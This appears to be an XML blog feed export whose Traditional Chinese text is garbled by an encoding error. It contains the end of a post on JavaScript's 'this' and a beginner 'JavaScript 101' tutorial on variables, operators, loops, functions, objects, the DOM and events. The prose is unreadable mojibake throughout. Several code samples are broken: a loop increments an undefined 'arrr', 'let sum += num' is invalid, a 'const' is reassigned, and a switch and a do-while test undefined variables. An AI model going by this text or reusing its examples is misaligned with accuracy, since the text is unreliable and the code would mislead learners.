æˆ‘å° this çœŸæ­£é–‹ç«…çš„æ™‚å€™æ˜¯çœ‹åˆ°äº†this çš„å€¼åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿä¸€æ¬¡è¯´æ¸…æ¥šé€™ç¯‡æ–‡ç« ï¼Œç°¡ç›´å°±æ˜¯é†é†çŒé ‚ï¼ŒæŠŠä¸€èˆ¬çš„ function å‘¼å«æ›æˆç”¨ call çš„é€™ç¨®å½¢å¼æ˜¯å€‹å¾ˆå®¹æ˜“ç†è§£ä¹Ÿå¾ˆå®¹æ˜“è¨˜çš„æ–¹æ³•ï¼Œè€Œä¸”å¯ä»¥æ‡‰ç”¨åœ¨ä¹æˆçš„å ´æ™¯åº•ä¸‹ã€‚
æœ€å¾Œï¼Œå†æ¬¡å¼·èª¿é€™ç¯‡æ–‡ç« æ˜¯æœ‰ç–æ¼çš„ï¼Œé–‹é ­çš„é‚£å¹¾å€‹ç¯„ä¾‹ä»¥é€™ç¯‡æ–‡ç« æ‰€å­¸åˆ°çš„çŸ¥è­˜ä¾ç„¶ç„¡æ³•è§£é‡‹ï¼Œé‚£çœŸçš„æ˜¯è¦çœ‹ ECMAScript æ‰æœƒçŸ¥é“ï¼›è€Œç€è¦½å™¨çš„ event çš„ this æˆ‘ä¹Ÿæ²’æï¼Œä½†é€™éƒ¨åˆ†æ¯”è¼ƒç°¡å–®å°±æ˜¯äº†ã€‚æˆ‘åªæ±‚é€™ç¯‡æ–‡ç« èƒ½è®“ä½ çŸ¥é“å…«æˆçš„ç‹€æ³åº•ä¸‹ this çš„å€¼æœƒæ˜¯ä»€éº¼ï¼Œå…¶ä»–å…©æˆè«‹å¦å°‹é«˜æ˜ã€‚
é€™ç¯‡èåˆäº†æˆ‘çœ‹éçš„å¹¾ç¯‡æ–‡ç« å¸¶çµ¦æˆ‘çš„æƒ³æ³•ï¼Œä¹Ÿèåˆäº†è‡ªå·±èæœƒè²«é€šå¾Œçš„é«”æ‚Ÿï¼Œå¸Œæœ›æˆ‘ä¹Ÿèƒ½å¸¶çµ¦é‚£äº›å¡åœ¨ this è¨±ä¹…çš„åˆå­¸è€…å€‘ä¸€äº›æ–°çš„æƒ³æ³•ï¼Œåœ¨çœ‹å®Œé€™ç¯‡æ–‡ç« ä¹‹å¾Œèƒ½å¤ ä»¥ä¸åŒçš„è§’åº¦å»æ€è€ƒ this çš„å€¼ä»¥åŠå®ƒå­˜åœ¨çš„æ„ç¾©ã€‚
å¯«å®Œé€™ç¯‡ä»¥å¾Œï¼Œé—œæ–¼ JavaScript é‚£äº›éå¸¸å¸¸è¦‹ä½†æˆ‘ä»¥å‰å®Œå…¨æ²’å¼„æ‡‚çš„å•é¡Œå°±éƒ½è§£é‡‹çš„å·®ä¸å¤šäº†ï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹å€‘å¯ä»¥åƒè€ƒå…¶ä»–çš„ä¸»é¡Œï¼š

è©²ä¾†ç†è§£ JavaScript çš„åŸå‹éŠäº†
æ·±å…¥æ¢è¨ JavaScript ä¸­çš„åƒæ•¸å‚³éï¼šcall by value é‚„æ˜¯ referenceï¼Ÿ
æˆ‘çŸ¥é“ä½ æ‡‚ hoistingï¼Œå¯æ˜¯ä½ äº†è§£åˆ°å¤šæ·±ï¼Ÿ
æ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ï¼šè«‡ JS ä¸­çš„ä½œç”¨åŸŸèˆ‡ Closure

åƒè€ƒè³‡æ–™ï¼š

JavaScriptæ·±å…¥ä¹‹ä»ECMAScriptè§„èŒƒè§£è¯»this
this çš„å€¼åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿä¸€æ¬¡è¯´æ¸…æ¥š
Whatâ€™s THIS in JavaScript ?
JS this

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>this</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 101 å¿«é€Ÿå…¥é–€æ•™å­¸</title>
    <url>/2017/01/14/javascript101-tutorial/</url>
    <content><![CDATA[
å‰è¨€Java å’Œ JavaScript é›–ç„¶åç¨±ç›¸ä¼¼ï¼Œä½†å»æ˜¯ç†±ç‹—å’Œç‹—çš„å·®åˆ¥ã€‚JavaScript æ˜¯ç”± Netscape å·¥ç¨‹å¸« Brendan Eich æ–¼ 1995 å¹´åƒ…èŠ± 10 å¤©æ‰€è¨­è¨ˆçš„ç¨‹å¼èªè¨€ï¼Œä¹Ÿå› ç‚ºä¸€äº›æ­·å²å› ç´ ï¼ŒJavaScript æˆç‚ºè¢«èª¤è§£æœ€æ·±çš„ç¨‹å¼èªè¨€ã€‚JavaScript æ˜¯ä¸€ç¨®ç›´è­¯å¼ã€åŸºæ–¼åŸå‹ï¼ˆprototype basedï¼‰çš„ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€ï¼Œä½†åˆå…·æœ‰å‡½æ•¸å¼ç¨‹å¼è¨­è¨ˆï¼ˆFunctional programmingï¼‰çš„ç‰¹æ€§ã€‚å…¶å…·å‚™ç°¡å–®å¥½ä¸Šæ‰‹ã€æ‡‰ç”¨ç¯„åœå»£æ³›ï¼Œå®¹æ˜“æœ‰æˆå°±æ„Ÿï¼Œä½†ç²¾é€šä¸æ˜“ç­‰ç‰¹æ€§ã€‚éå»ä¸€æ®µæ™‚é–“ JavaScript ä¸€ç›´è¢«èªç‚ºæ˜¯ç©å…·èªè¨€ï¼Œé›£ç™»å¤§é›…ä¹‹å ‚ã€‚ä½†éš¨è‘—ç‰ˆæœ¬çš„æ¼”é€²ï¼Œå†åŠ ä¸Š NodeJS çš„å‡ºç¾ï¼Œè®“ JavaScript ç”±é»‘ç¿»ç´…æˆç‚ºç¨‹å¼èªè¨€çš„ç•¶ç´…å·¨æ˜Ÿï¼Œç›®å‰é›„æ“šåœ¨ç¨‹å¼èªè¨€æ’è¡Œæ¦œå‰å¹¾åï¼Œé™¤äº†ç¶²é é–‹ç™¼å¤–ï¼Œåœ¨è¨±å¤šçš„é ˜åŸŸéƒ½å¯ä»¥çœ‹åˆ° JavaScript çš„èº«å½±ã€‚æœ¬æ–‡å°‡å¿«é€Ÿå¸¶é ˜å¤§å®¶æŒæ¡ JavaScript é‡è¦ä¸”æ ¸å¿ƒçš„è§€å¿µã€‚
ç’°å¢ƒå»ºç½®JavaScript çš„æª”æ¡ˆåªè¦ä½¿ç”¨ä¸€èˆ¬çš„æ–‡å­—ç·¨è¼¯å™¨å³å¯ç·¨è¼¯ï¼ˆå­˜æˆ .js æª”æ¡ˆï¼‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Sublime Text ç­‰ç·¨è¼¯å™¨é€²è¡Œé–‹ç™¼ï¼ŒJSBin é€™å€‹ç·šä¸Šå·¥å…·é€²è¡Œæ¸¬è©¦ï¼ˆç•¶ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ Chromeã€Firefox ç­‰ç€è¦½å™¨çš„é–‹ç™¼è€…å·¥å…·ï¼‰ã€‚é™¤äº†ç·¨è¼¯å™¨å¤–ï¼Œå¯¦éš›é–‹ç™¼ä¸Šæˆ‘å€‘ä¹Ÿæœƒéœ€è¦ç”¨åˆ° Node.js é–‹ç™¼ç’°å¢ƒ å’Œ NPM å¥—ä»¶ç®¡ç†ç³»çµ±ï¼ˆæŒ‰ç…§ Node.js å®˜æ–¹æŒ‡ç¤ºå³å¯å®‰è£ï¼‰ã€‚Node.js æ˜¯ä¸€å€‹é–‹æ”¾åŸå§‹ç¢¼ã€è·¨å¹³å°çš„ã€å¯ç”¨æ–¼ä¼ºæœå™¨ç«¯å’Œç¶²è·¯æ‡‰ç”¨çš„åŸ·è¡Œç’°å¢ƒã€‚
JavaScript ç¨‹å¼ä½¿ç”¨æ–¹å¼ï¼ˆHTML ä¸­å¼•å…¥ï¼‰
å…§åµŒæ–¼ &lt;head&gt;&lt;/head&gt; (å›  JS ç‚ºç›´è­¯å¼ç¨‹å¼èªè¨€ï¼Œè®€åˆ°å³æœƒåŸ·è¡Œ)
 &lt;head&gt; 	&lt;script&gt;		alert(Hello JavaScript);	&lt;/script&gt;&lt;/head&gt;

å…§åµŒæ–¼ &lt;body&gt;&lt;/body&gt; ä¹‹ä¸­ (å¯ä»¥è®“ HTML å„ªå…ˆè¼‰å…¥)
 &lt;body&gt; &lt;script&gt;	alert(Hello JavaScript);&lt;/script&gt;&lt;/body&gt;

å¤–éƒ¨å¼•å…¥æª”æ¡ˆç½®æ–¼ &lt;head&gt; æˆ– &lt;body&gt; å…§ (æ¨è–¦ä½¿ç”¨)
 &lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;

æ³¨æ„å¤–éƒ¨å¼•å…¥çš„ &lt;script&gt;&lt;/script&gt; ä¸­ä¸å¯å†å¯« JSã€‚
è®Šæ•¸åœ¨ç¨‹å¼èªè¨€ä¸­è®Šæ•¸æ˜¯ä¸€å€‹æš«æ™‚å„²å­˜è³‡æ–™çš„åœ°æ–¹ï¼Œè³¦å€¼çµ¦è®Šæ•¸çš„å€¼éƒ½æœƒæœ‰å°æ‡‰çš„è³‡æ–™å‹æ…‹ï¼Œç„¶è€Œ JavaScript æ˜¯å¼±å‹åˆ¥ï¼ˆWeak typeï¼‰æ‰€ä»¥æœƒæœ‰è‡ªå‹•è½‰å‹çš„æƒ…å½¢ã€‚
åœ¨ JavaScript ä¸­ï¼Œå…¨åŸŸè®Šæ•¸å°‡ä½¿ç”¨ varï¼Œè€Œåœ¨ ES6 ä¸­ç‚ºäº†è§£æ±ºè®Šæ•¸æ±¡æŸ“æˆ–èª¤ç”¨æƒ…å½¢å°‡ block-scope çš„è®Šæ•¸ä½¿ç”¨ letï¼Œè‹¥ä½ éœ€è¦å›ºå®šä¸è®Šçš„å¸¸æ•¸å‰‡æ˜¯ä½¿ç”¨ constã€‚ å…¶ä¸­è®Šæ•¸å‹åˆ¥åˆåˆ†ç‚ºï¼šPrimitive Data Typeï¼šStringã€Numberã€Booleanï¼ˆ true æˆ– falseï¼‰ã€undefindedã€nullï¼ŒReference Data Typesï¼šObject å…©ç¨®ï¼Œå·®åˆ¥åœ¨æ–¼å°‡ç‰©ä»¶è®Šæ•¸è³¦å€¼çµ¦å¦å¤–ä¸€å€‹è®Šæ•¸æ™‚æ˜¯æŠŠå¼•ç”¨è³¦å€¼çµ¦æ–°è®Šæ•¸ï¼Œæ‰€ä»¥ç•¶æ–°è®Šæ•¸æ›´æ”¹å±¬æ€§æ™‚æœƒå½±éŸ¿åˆ°åŸä¾†ç‰©ä»¶ã€‚
Primitive Data Typeï¼š
var num = 12;const str = &#x27;Mark&#x27;;function checkLike() &#123;	let isActived = true;&#125;// console.log å¯ä»¥è®“é–‹ç™¼è€…é€éç€è¦½å™¨é–‹ç™¼è€…å·¥å…·çœ‹åˆ°è¨Šæ¯ï¼Œæ–¹ä¾¿é™¤éŒ¯console.log(num);console.log(str);// å› ç‚º let æ˜¯ function block scopeï¼Œæ•…æœƒç”¢ç”Ÿ &quot;ReferenceError: isActived is not defined éŒ¯èª¤console.log(isActived);

Reference Data Typesï¼š
// å°‡ç‰©ä»¶è®Šæ•¸è³¦å€¼çµ¦å¦å¤–ä¸€å€‹è®Šæ•¸æ™‚æ˜¯æŠŠå¼•ç”¨è³¦å€¼çµ¦æ–°è®Šæ•¸ï¼Œæ‰€ä»¥ç•¶æ–°è®Šæ•¸æ›´æ”¹å±¬æ€§æ™‚æœƒå½±éŸ¿åˆ°åŸä¾†ç‰©ä»¶let a = &#123; name: &#x27;Zuck&#x27; &#125;;console.log(a);let b = a;b.name = &#x27;Jack&#x27;;console.log(a);

é‹ç®—å­&#x2F;é‹ç®—å…ƒåœ¨ç¨‹å¼èªè¨€ä¸­éƒ½éœ€è¦é‹ç®—å­ï¼Œåœ¨ JavaScript ä¸­æœ‰è³¦å€¼é‹ç®—å­ã€ç®—æ•¸é‹ç®—å­ã€æ¯”è¼ƒé‹ç®—å­ã€é‚è¼¯é‹ç®—å­ç­‰ä¸åŒé‹ç®—å­ã€‚

è³¦å€¼é‹ç®—å­ï¼šä½¿ç”¨ = çµ¦å®šå€¼çµ¦è®Šæ•¸
 // Markconst name = &#x27;Mark&#x27;;

ç®—æ•¸é‹ç®—å­ï¼šå››å‰‡é‹ç®—
 // 4const sum = 1 + 3;

æ¯”è¼ƒé‹ç®—å­ï¼šæ•¸å€¼æ¯”è¼ƒ
 const age = 23;// trueconst canVote = age &gt;= 20;// falseconst canVote = age &lt; 20;

é‚è¼¯é‹ç®—å­ï¼šé‚è¼¯åˆ¤æ–·
 const a = true;const b = true;// ä¸”ï¼Œè¦å…©å€‹éƒ½ trueconst result1 = a &amp;&amp; b;// æˆ–ï¼Œåªè¦æœ‰ä¸€å€‹ trueï¼Œå³ç‚º trueconst result2 = a || b;

æµç¨‹æ§åˆ¶ï¼ˆflow controlï¼‰åœ¨ JavaScript ä¸­å’Œè¨±å¤šç¨‹å¼èªè¨€ä¸€æ¨£æœ‰ if...elseã€switch æ¢ä»¶åˆ¤æ–·ä»¥åŠåœ¨è™•ç†é™£åˆ—ä¸Šå¾ˆå¸¸ä½¿ç”¨çš„è¿´åœˆï¼ˆç•¶æœ‰æ˜ç¢ºæ¬¡æ•¸æ™‚ä½¿ç”¨ forï¼Œç•¶æ²’æœ‰æ˜ç¢ºæ•¸å­—æ™‚ä½¿ç”¨ whileï¼‰
å¦å¤–è¦æ³¨æ„çš„æ˜¯åœ¨ JavaScript ä¸­çš„ falsey å€¼ï¼šundefinedã€nullã€NaNã€0ã€&quot;&quot;ï¼ˆç©ºå­—ä¸²ï¼‰å’Œ falseï¼Œä»¥ä¸Šå¹¾ç¨®æƒ…æ³åœ¨é‚è¼¯åˆ¤æ–·æ™‚æœƒè½‰æ›æˆ false

ifâ€¦else
 // å¯ä»¥æŠ•ç¥¨if(age &gt; 20) &#123;	console.log(&#x27;å¯ä»¥æŠ•ç¥¨ï¼&#x27;);&#125;

switchï¼šç•¶æ¢ä»¶å¾ˆå¤šæ™‚å¯ä»¥å–„ç”¨ switch åˆ¤æ–·ï¼Œè¨˜å¾—è¦åœ¨æ¯å€‹ case å¾Œå¯« breakï¼Œä¸ç„¶æœƒå…¨éƒ¨éƒ½åŸ·è¡Œ	
 const country = &#x27;Taiwan&#x27;;switch(grade) &#123;	case &#x27;Taiwan&#x27;:		console.log(&#x27;hello&#x27; + country);		break;	case &#x27;Japan&#x27;:		console.log(&#x27;hello&#x27; + country);		break;	case &#x27;Korea&#x27;:		console.log(&#x27;hello&#x27; + country);		break;	default:		console.log(&#x27;hello&#x27; + country);		&#125;

forï¼šç•¶ä½ çŸ¥é“ç¨‹å¼éœ€è¦é‡è¤‡åŸ·è¡Œå¹¾æ¬¡æ™‚å¯ä»¥ä½¿ç”¨ for è¿´åœˆ
 const arr = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Jack&#x27;];for(let i = 0; i &lt; arr.length; arrr++) &#123;	console.log(arr[i]);&#125;

whileï¼šç•¶ä½ ç¨‹å¼ä¸çŸ¥é“éœ€è¦é‡è¤‡åŸ·è¡Œå¹¾æ¬¡æ™‚å¯ä»¥ä½¿ç”¨ while è¿´åœˆ
 // å¾ 1 ç´¯åŠ åˆ° 10const num = 1;while(num &lt;= 10) &#123;	let sum += num; // sum = sum + num	num += 1;&#125;

doâ€¦whileï¼šç•¶è¿´åœˆæ¬¡æ•¸ä¸æ˜ç¢ºæ™‚ï¼Œå¯ä»¥ä½¿ç”¨ whileï¼Œè€Œ do while æœƒè‡³å°‘åŸ·è¡Œä¸€æ¬¡
 let x = 0;while(x &lt; 10) &#123;	console.log(x);	x++;&#125;let y = 0;do &#123;	console.log(y);	y++;	&#125; while(i &lt; 10);

å‡½å¼&#x2F;å‡½æ•¸ï¼ˆfunctionï¼‰å‡½æ•¸æ˜¯ä¸€ç¨®å¯ä»¥è®“ä¸€æ®µç¨‹å¼å€å¡Šé‡è¤‡ä½¿ç”¨çš„ç¨‹å¼æ’°å¯«æ–¹å¼ï¼Œåœ¨ JavaScript ä¸­å‡½æ•¸å±¬æ–¼ä¸€ç´šç‰©ä»¶ï¼ˆfirst class objectï¼‰ï¼Œå¯ä»¥å°‡å‡½æ•¸ç•¶åƒæ•¸æˆ–è®Šæ•¸å‚³éï¼Œå…¶æ‰®æ¼”éå¸¸é‡è¦çš„è§’è‰²ï¼Œä¹Ÿè®“ JavaScript åœ¨å‡½æ•¸å¼ç¨‹å¼è¨­è¨ˆï¼ˆfunctional programmingï¼‰ä¸Šæ›´å®¹æ˜“ç™¼æ®ã€‚å‡½æ•¸å¯ä»¥å‚³å…¥åƒæ•¸ï¼ˆå¦‚ä¸‹çš„ x, yï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½æ²’æœ‰ã€‚å‡½æ•¸ä½¿ç”¨ return å›å‚³å€¼ï¼Œè‹¥æ²’å¯«å‰‡å›å‚³ undefined
function sum(x, y) &#123;	return x + y;&#125;sum(12, 20);

åœ¨ ES6 ç°¡åŒ–äº†å‡½æ•¸çš„ä½¿ç”¨å‡ºç¾äº†ç®­é ­å‡½æ•¸ï¼ˆarrow functionï¼‰ï¼š
const sum = (x, y) =&gt; &#123;	return x + y;&#125;;sum(1, 2);

ç‰©ä»¶ï¼ˆobjectï¼‰ç‰©ä»¶æ˜¯ä¸€ç¨®å„²å­˜è³‡æ–™çš„è³‡æ–™çµæ§‹ï¼Œå¯ä»¥å°æ‡‰æˆçœŸå¯¦ä¸–ç•Œçš„ç‰©ä»¶ï¼ˆæœ‰å±¬æ€§å€¼å’Œæ–¹æ³•ï¼‰ï¼Œä¸€èˆ¬è€Œè¨€ä¸»è¦æœ‰ä¸‰ç¨®å»ºç«‹æ–¹å¼ï¼š

ä½¿ç”¨ new Object
 var obj = new Object();

ä½¿ç”¨ &#123;&#125;
 var obj = &#123;	name: &#x27;Mark&#x27;,	age: 23&#125;

ä½¿ç”¨å»ºæ§‹å‡½æ•¸
 é›–ç„¶ JavaScript ä¸¦éæ˜¯ class-based çš„ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€ï¼Œè€Œæ˜¯ prototype-based çš„ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€ï¼Œä½†åœ¨ JavaScript å¯ä»¥é€é function å»ºç«‹é¡åˆ¥çš„å®£å‘Šå‡½æ•¸ï¼ˆåœ¨ ES6 ä¸­å·²æœ‰ class å¯ä»¥ä½¿ç”¨ï¼Œä½†åªæ˜¯å€‹èªæ³•ç³–ï¼‰ï¼š
 // å¯¦å‹™ä¸Šå»ºæ§‹å‡½æ•¸å‘½åæ¡å–®å­—é¦–å­—å¤§å¯«ã€‚ç‹—ç‹—ç‰©ä»¶æœ‰ name, age å±¬æ€§ï¼Œæ–¹æ³•æ˜¯ wow function Dog(name, age) &#123;	// å±¬æ€§å€¼	this.name = name;	this.age = age;	// æ¯å€‹å¯¦ä¾‹éƒ½æœƒæœ‰ä¸€ä»½æ–¹æ³•å‰¯æœ¬	this.wow = function() &#123;		console.log(&#x27;wow!wow&#x27;);	&#125;&#125;// å¤šå€‹å¯¦ä¾‹å…±ç”¨ï¼Œå¯ä»¥æ¸›å°‘è¨˜æ†¶é«”ç­‰è³‡æºé‹ç”¨Dog.prototype.cry = function() &#123;	console.log(&#x27;QQQ&#x27;);&#125;const dog = new Dog(&#x27;lucky&#x27;, 2);// wow!wow!dog.wow();

DOM &amp; BOMäº‹å¯¦ä¸Š HTML å¯ä»¥è½‰æ›æˆä¸€æ£µç‰©ä»¶æ¨¹ï¼Œä¹Ÿç¨±ç‚º Document Object Modelï¼ˆDOMï¼‰ã€‚åœ¨æ’°å¯«ç¶²é æ‡‰ç”¨ç¨‹å¼æ™‚å¾€å¾€éœ€è¦æ“ä½œåˆ°ç€è¦½å™¨å…ƒç´ ï¼Œæˆ‘å€‘é€šå¸¸æ˜¯é€éé¸å–æˆ‘å€‘æƒ³è¦æ”¹è®Šçš„å…ƒç´ ï¼ˆé¸æ“‡å™¨ï¼‰ï¼Œç„¶å¾Œä¿®æ”¹æˆ‘å€‘çš„ç‰©ä»¶å±¬æ€§

ç‰©ä»¶æ¨¡å‹
 æ‰€è¬‚çš„ç‰©ä»¶æ¨¡å‹ï¼ˆObject Modelï¼‰å°æ–¼HTML ç¶²é ä¾†èªªï¼Œæ˜¯ä¸€ç¨®è¦ç¯„å¦‚ä½•å­˜å–HTML å…ƒç´ ã€CSS æ¨£å¼å’Œ JavaScript ç¨‹å¼ç¢¼çš„ä¸€ç¨®æ©Ÿåˆ¶ï¼Œå¯ä»¥å°‡HTMLå…ƒç´ ã€CSSæ¨£å¼å’Œ JavaScript ç¨‹å¼ç¢¼è¦–ç‚ºç‰©ä»¶

BOM
 
 BOM å°±æ˜¯ Browser Object Model  ä¸­æ–‡å«åšç€è¦½å™¨ç‰©ä»¶æ¨¡å‹ï¼Œwindow ç‰©ä»¶æ˜¯ç€è¦½å™¨æœ€é ‚å±¤ç‰©ä»¶ï¼Œå…¶ä¸‹æœ‰ documentï¼ˆDOMï¼‰ã€historyã€locationã€navigatorã€screen å­ç‰©ä»¶ã€‚window ç‰©ä»¶ä¸é ˆç¶“éå®£å‘Šï¼Œå¯ç›´æ¥ä½¿ç”¨ï¼Œä»£è¡¨ç›®å‰ç€è¦½å™¨è¦–çª—ã€‚äº‹å¯¦ä¸Šï¼Œæ‰€æœ‰çš„å…¨åŸŸè®Šæ•¸ã€å‡½å¼ã€ç‰©ä»¶ï¼Œå…¶å¯¦éƒ½æ˜¯å±¬æ–¼ window ç‰©ä»¶ï¼Œè€Œ BOM ç‰©ä»¶çš„ä½¿ç”¨å¯è®“æˆ‘å€‘æ“ä½œåŒ…å«é–‹å•Ÿ&#x2F;é—œé–‰è¦–çª—ï¼Œæ”¹è®Šè¦–çª—å¤§å°ï¼Œè¨ˆæ™‚å™¨èˆ‡å–å¾—ç¶²å€ã€å­˜å–ç€è¦½å™¨å±¬æ€§ç­‰

DOM
 æ–‡ä»¶ç‰©ä»¶æ¨¡å‹ï¼ˆDocument Object Modelï¼ŒDOMï¼‰æ˜¯çµ¦ HTML èˆ‡ XML æ–‡ä»¶ä½¿ç”¨çš„ä¸€çµ„ APIã€‚ç°¡å–®çš„èªªå°±æ˜¯å°‡æ–‡ä»¶ï¼ˆæ–‡ä»¶å¯ä»¥æƒ³æˆå–®ä¸€ç¶²é ï¼‰ç‰©ä»¶åŒ–ï¼Œä»¥ä¾¿æä¾›ä¸€å¥—é€šç”¨å­˜å–çš„æ–¹å¼ä¾†è™•ç†æ–‡ä»¶å…§å®¹ã€‚DOM æä¾›  HTML ç¶²é ä¸€ç¨®å­˜å–çš„æ–¹å¼ï¼Œå¯ä»¥å°‡ HTML å…ƒç´ è½‰æ›æˆä¸€æ£µç¯€é»æ¨¹ï¼Œæ¯ä¸€å€‹æ¨™ç±¤å’Œæ–‡å­—å…§å®¹æ˜¯ç‚ºä¸€å€‹ç¯€é»ï¼Œè®“æˆ‘å€‘å¯ä»¥èµ°è¨ªç¯€é» (Nodes) ä¾†å­˜å– HTML å…ƒç´  
 &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;My title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;	&lt;h1&gt;My header&lt;/h1&gt;	&lt;a href=&quot;&quot;&gt;My link&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;

 
 è¦æ“ä½œ DOM å…ƒç´ å‰è¦é¸å–è¦æ“ä½œå“ªå€‹

æ ¹æ“šIDåç¨±é¸å– document.getElementById(elementId)

æ ¹æ“šå…ƒç´ åç¨±é¸å– document.getElementsByTagName(tagName)

æ ¹æ“šåç¨±é¸å– document.getElementsByName(name) 

æ ¹æ“š Class åç¨±é¸å– document.getElementsByClassName(classname)


 æœ‰å¾ˆå¤šå…ƒç´ ç¬¦åˆï¼Œå›å‚³çš„æ˜¯ NodeList ç‰©ä»¶é›†åˆï¼Œä½¿ç”¨ item() å­˜å– (æ³¨æ„ Elementâ€™sâ€™)ï¼Œè¿­ä»£ä½¿ç”¨ forEach ä¸ç„¶å°±è¦è½‰é™£åˆ—
 document ç‰©ä»¶æœ‰æä¾›ä½¿ç”¨ CSS é¸æ“‡å™¨ä¾†é¸å–å…ƒç´ ï¼Œæ•ˆèƒ½è¼ƒå¥½

document.querySelectorAll() æ–¹æ³•  document ç‰©ä»¶çš„ querySelectorAll() æ–¹æ³•å¯ä»¥å–å¾— HTML çš„ç¯€é»é™£åˆ—æˆ–æ¸…å–®ï¼Œç‚ºä¸€å€‹ NodeList ç‰©ä»¶ï¼ˆè‹¥è¦ä½¿ç”¨ map æ–¹æ³•éœ€è¦è½‰é™£åˆ—ï¼Œä¸ç„¶åªèƒ½ç”¨ forEach ï¼‰

document.querySelector() æ–¹æ³• åªæœƒå›å‚³ä¸€å€‹ç¬¦åˆçš„å…ƒç´ ï¼Œæ²’æœ‰å°±å›å‚³ null


 ç¯„ä¾‹ï¼š
 &lt;div class=&quot;info&quot;&gt;&lt;/div&gt;&lt;div class=&quot;info&quot;&gt;&lt;/div&gt;&lt;div id=&quot;danger&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;	document.querySelector(&#x27;#danger&#x27;).innerHTML = &#x27;&lt;h1&gt;å˜¿å˜¿ï¼Œæ˜¯æˆ‘&lt;/h1&gt;&#x27;;	document.querySelectorAll(&#x27;.info&#x27;).forEach((value, index) =&gt; &#123;	  value.innerHTML = &#x27;&lt;h1&gt;åè‘—æ‰“ï¼Œæ™®å¤©ä¹‹ä¸‹æ’åç¬¬äºŒ&lt;/h1&gt;&#x27;;	&#125;);&lt;/script&gt;

äº‹ä»¶è™•ç†ï¼ˆevent handlerï¼‰äº‹ä»¶è™•ç†ï¼ˆEvent Handlersï¼‰æ˜¯ JavaScript éå¸¸é‡è¦çš„åŠŸèƒ½ï¼Œäº‹ä»¶æ˜¯ç”¨ä¾†è™•ç† JavaScript èˆ‡ HTML ä¹‹é–“çš„äº’å‹•ã€å»ºç«‹å‹•ç•«æ•ˆæœä¸¦å’Œä½¿ç”¨è€…äº’å‹•

äº‹ä»¶è™•ç†ç°¡å–®èªªå°±æ˜¯ç•¶ä¸€å€‹äº‹ä»¶ç™¼ç”Ÿæ™‚ï¼ˆç¶²é è¼‰å…¥ã€æŒ‰ä¸‹å³éµç­‰ï¼‰ï¼Œç¨‹å¼æœƒç›¸å°æ‡‰åšå‡ºæ€æ¨£çš„è™•ç†

ä¾‹å¦‚ï¼šç•¶ä½¿ç”¨è€…æŒ‰ä¸‹æŒ‰éˆ•æ™‚æœƒè§¸ç™¼ click çš„äº‹ä»¶ï¼ˆäº‹ä»¶ç™¼ç”Ÿï¼‰ä¸¦è®“æŒ‰éˆ•è®Šæˆç´…è‰²ï¼ˆè™•ç†äº‹ä»¶ï¼‰ï¼Œé€™å°±æ˜¯ä¸€ç¨®äº‹ä»¶è™•ç†æ©Ÿåˆ¶


äº‹ä»¶è™•ç†æ©Ÿåˆ¶äº‹ä»¶è™•ç† = äº‹ä»¶ç¨®é¡ + äº‹ä»¶è™•ç†æ–¹æ³•


äº‹ä»¶ç¨®é¡ï¼ˆEvent Typeï¼‰åˆç¨±äº‹ä»¶åç¨± (Event Name)ï¼Œç‚ºä¸€å€‹å­—ä¸²ï¼Œèªªæ˜ç™¼ç”Ÿäº†ä»€éº¼äº‹ä»¶ï¼Œä¾‹å¦‚ï¼šclick (é»æ“Š)ã€mousemove (æ»‘é¼ æ»‘é)

äº‹ä»¶è™•ç†ï¼ˆEvent Handlersï¼‰ä¿‚æŒ‡è™•ç†äº‹ä»¶çš„å‡½æ•¸åç¨±ï¼Œç•¶äº‹ä»¶ç™¼ç”Ÿæ™‚è¦å‘¼å«å“ªå€‹å‡½æ•¸é€²è¡Œè™•ç†


// ç•¶ç™¼ç”Ÿ click äº‹ä»¶ï¼Œæœƒç™¼å‡º alert btn.addEventListener(&#x27;click&#x27;, function() &#123;	  alert(&#x27;è¢«é»äº†!&#x27;);&#125;);  

å®Œæ•´ç¯„ä¾‹ï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset=&quot;utf-8&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;  &lt;title&gt;JS Bin&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;button id=&quot;btn&quot;&gt;é»æˆ‘é»æˆ‘&lt;/button&gt;  &lt;script type=&quot;text/javascript&quot;&gt;	const btn = document.querySelector(&#x27;#btn&#x27;);	btn.addEventListener(&#x27;click&#x27;, function() &#123;	  alert(&#x27;è¢«é»äº†!&#x27;);	&#125;);  	  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;

